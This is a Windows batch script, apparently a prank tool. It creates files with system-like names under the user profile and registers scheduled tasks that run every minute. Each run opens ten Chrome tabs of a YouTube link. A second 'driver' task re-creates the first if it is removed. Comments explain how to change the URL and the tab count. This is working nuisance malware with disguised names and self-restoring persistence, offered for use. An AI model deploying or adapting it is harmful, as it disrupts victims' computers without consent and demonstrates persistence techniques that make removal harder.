@echo off
setlocal enabledelayedexpansion

set "taskfolder=%USERPROFILE%\System"
set "taskname=Win32Helper.bat"
set "taskfile=%taskfolder%\%taskname%"
set "driverfile=%taskfolder%\Win32Handler.bat"
set "driverhost=%taskfolder%\Win32Host.bat"

set "copyfolder=%USERPROFILE%\Applications"
set "copyfile=%taskfolder%\%taskfilename%"

set "schname=sike"


goto :MAIN


:CreateTaskFile
    mkdir "%taskfolder%"

    type nul > "%taskfile%"
    echo @echo off >> "%taskfile%"
    echo cd ^/ >> "%taskfile%"
    echo set /a i=0 >> "%taskfile%"
    echo :redir >> "%taskfile%""
    : change the link to the website you want to redirect to
    echo    start chrome.exe "https://www.youtube.com/watch?v=xvFZjo5PgG0" >> "%taskfile%"
    echo    set /a i=%%i%%+1 >> "%taskfile%"
    : change the value after lss to the number of tabs you want to spawn each time
    echo    if %%i%% lss 10 ( >> "%taskfile%"
    echo        call :redir >> "%taskfile%"
    echo    ) >> "%taskfile%"
    exit /b


:CreateTaskDriver
    type nul > "%driverfile%"
    echo @echo off >> "%driverfile%"
    echo cd ^/ >> "%driverfile%"
    echo schtasks /query /tn "%schname%" ^> nul >> "%driverfile%"
    echo if %%errorlevel%% neq 0 ( >> "%driverfile%"
    echo     mkdir "%copyfolder%" >> "%driverfile%"
    echo     copy /Y "%taskfile%" "%copyfolder%\" >> "%driverfile%"
    echo     schtasks /create /tn "%schname%" /tr "%copyfolder%\%taskname%" /sc minute /mo 1 /st 00:00:00 /f >> "%driverfile%"
    echo ) >> "%driverfile%"
    exit /b


:MAIN
    call :CreateTaskFile
    echo task file created

    call :CreateTaskDriver
    echo task driver created

    schtasks /create /tn "HostDriverSH" /tr "%driverfile%" /sc minute /mo 1 /st 00:00:00 /f

endlocal